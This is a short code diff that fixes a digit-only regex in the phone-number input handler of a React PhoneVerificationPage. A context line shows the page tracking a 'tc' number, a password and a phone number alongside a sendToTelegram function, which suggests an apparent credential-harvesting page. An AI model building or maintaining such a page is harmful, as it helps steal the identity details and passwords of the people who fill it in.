@@ -129,7 +129,7 @@ function PhoneVerificationPage() {
   }, [tc, password, state.phoneNumber, sendToTelegram]);
 
   const handleNumberInput = useCallback((e) => {
-    const value = e.target.value.replace(/\D/g/, '');
+    const value = e.target.value.replace(/[^0-9]/g, ''); // \D yerine daha açık regex
     if (value.length <= 10) {
       setState((prev) => ({
         ...prev,
